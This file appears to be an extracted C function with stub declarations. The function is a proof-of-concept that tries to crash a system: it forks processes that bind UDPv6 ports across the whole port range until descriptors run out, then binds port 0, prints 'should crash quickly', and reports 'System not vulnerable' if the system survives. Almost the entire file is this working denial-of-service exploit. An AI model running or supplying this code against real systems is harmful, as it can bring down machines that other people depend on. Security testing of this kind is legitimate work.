
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int uint16_t ;
typedef scalar_t__ pid_t ;


 int EADDRINUSE ;
 int EMFILE ;
 int WEXITSTATUS (int) ;
 int WIFEXITED (int) ;
 int bind_udpv6_port (int ) ;
 int close (int) ;
 int errno ;
 int exit (int) ;
 scalar_t__ fork () ;
 int get_fd_limit () ;
 int get_port_range (int *) ;
 scalar_t__ getpid () ;
 int puts (char*) ;
 int wait (int*) ;

__attribute__((used)) static int
proof (void)
{
 int lim, val = 2;
 pid_t pid, ppid;
 uint16_t range[2], port;

 lim = get_fd_limit ();
 if (lim <= 3)
  return -2;

 get_port_range (range);

 port = range[0];
 ppid = getpid ();

 puts ("Stage 1...");
 do
 {
  switch (pid = fork ())
  {
   case 0:
    for (val = 3; val < lim; val++)
     close (val);

    do
    {
     if (bind_udpv6_port (port) >= 0)
     {
      if (port)
       port++;
     }
     else
     if (port && (errno == EADDRINUSE))
      port++;
     else
     if (errno != EMFILE)


      exit (1);

     if (port > range[1])
     {
      puts ("Stage 2... should crash quickly");
      port = 0;
     }
    }
    while (errno != EMFILE);

    break;

   case -1:
    exit (2);

   default:
    wait (&val);
    if (ppid != getpid ())
     exit (WIFEXITED (val) ? WEXITSTATUS (val) : 2);
  }
 }
 while (pid == 0);

 puts ("System not vulnerable");
 return -val;
}
